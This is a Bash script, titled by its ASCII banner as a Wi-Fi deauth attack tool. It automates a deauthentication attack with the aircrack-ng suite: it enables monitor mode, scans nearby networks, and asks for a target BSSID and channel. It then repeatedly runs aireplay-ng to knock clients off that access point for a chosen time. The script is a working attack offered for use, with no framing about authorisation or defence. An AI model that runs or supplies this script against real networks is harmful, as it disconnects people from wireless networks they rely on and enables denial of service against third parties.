#!/bin/bash
clear

# ASCII art banner
echo "
 █████   ███   █████  ███             ███████████  ███               
░░███   ░███  ░░███  ░░░             ░░███░░░░░░█ ░░░                
 ░███   ░███   ░███  ████             ░███   █ ░  ████               
 ░███   ░███   ░███ ░░███  ██████████ ░███████   ░░███               
 ░░███  █████  ███   ░███ ░░░░░░░░░░  ░███░░░█    ░███               
  ░░░█████░█████░    ░███             ░███  ░     ░███               
    ░░███ ░░███      █████            █████       █████              
     ░░░   ░░░      ░░░░░            ░░░░░       ░░░░░               
                                                                                                               
     █████                                █████    █████             
    ░░███                                ░░███    ░░███              
  ███████   ██████   ██████   █████ ████ ███████   ░███████          
 ███░░███  ███░░███ ░░░░░███ ░░███ ░███ ░░░███░    ░███░░███         
░███ ░███ ░███████   ███████  ░███ ░███   ░███     ░███ ░███         
░███ ░███ ░███░░░   ███░░███  ░███ ░███   ░███ ███ ░███ ░███         
░░████████░░██████ ░░████████ ░░████████  ░░█████  ████ █████        
 ░░░░░░░░  ░░░░░░   ░░░░░░░░   ░░░░░░░░    ░░░░░  ░░░░ ░░░░░         
                                                                                                                          
            █████     █████                       █████              
           ░░███     ░░███                       ░░███               
  ██████   ███████   ███████    ██████    ██████  ░███ █████         
 ░░░░░███ ░░░███░   ░░░███░    ░░░░░███  ███░░███ ░███░░███          
  ███████   ░███      ░███      ███████ ░███ ░░░  ░██████░           
 ███░░███   ░███ ███  ░███ ███ ███░░███ ░███  ███ ░███░░███          
░░████████  ░░█████   ░░█████ ░░████████░░██████  ████ █████         
 ░░░░░░░░    ░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                                                                 
"

# Function to check whether the "k" key has been pressed
check_key_press() {
    # We read the key in non-blocking mode
    read -rsn1 -t 0.1 key

    # If the "k" key was pressed, we return 0
    [[ "$key" == "k" ]]
}

echo "Remember that the script must be run as root!"
echo "And your WiFi card must have the MONITOR MODE function"

sleep 6
clear

# Display available WiFi interfaces
iwconfig

# Prompt the user to select an interface
read -p "Select WiFi interface (e.g. wlan1):" wlanx

# Starting monitor mode for the selected card
airmon-ng check
airmon-ng check kill
airmon-ng start "$wlanx"

echo "In a moment, a scan of available Wi-Fi networks will begin."
echo "Stop scanning by pressing CTRL + C"

# Ask the user what type of network to scan
read -p "What type of network do you want to scan? (1 - 2.4 GHz, 2 - 5 GHz):" network_type

# Check the user's response and run the appropriate scan
if [[ "$network_type" == "1" ]]; then
    airodump-ng "$wlanx"
elif [[ "$network_type" == "2" ]]; then
    sudo airodump-ng "$wlanx" --band a
else
    echo "Incorrect selection. Select 1 or 2."
    exit 1
fi

# Query the user for the network's BSSID
read -p "Enter the BSSID of the selected network: " bssid

# Query the user for a network channel
read -p "Enter the CH channel of the selected network: " ch

# Listen to the selected network on the selected channel
echo "In a moment, the selected Wi-Fi channel will be listened to."
echo "You will see how many devices are connected to the AP."
echo "Stop listening by pressing CTRL + C"
sleep 5
airodump-ng -d "$bssid" -c "$ch" "$wlanx"

# Query the user for the execution time of the aireplay-ng command
read -p "Enter the time to perform the deauthorization attack (in seconds): " sekundy

echo "A deauthorization attack of the selected Wi-Fi network will soon occur."
echo "Interrupt the attack by pressing the 'K' key!"
sleep 5

# Attack start time
start_time=$(date +%s)

# Perform a deauthentication attack for a specified number of seconds or until the "k" key is pressed
while true; do
    # Current time
    current_time=$(date +%s)

    # Check if time has passed or the "k" key has been pressed
    if [[ $((current_time - start_time)) -ge $sekundy ]]; then
        break
    fi

    # Check if the "k" key was pressed
    if check_key_press; then
        break
    fi

    # Performing a deauthentication attack
    aireplay-ng --deauth 10 -a "$bssid" -D "$wlanx"
done

# Stopping monitor mode for the selected card
airmon-ng stop "$wlanx"

# Restoring normal operation of the WiFi network
systemctl restart NetworkManager.service
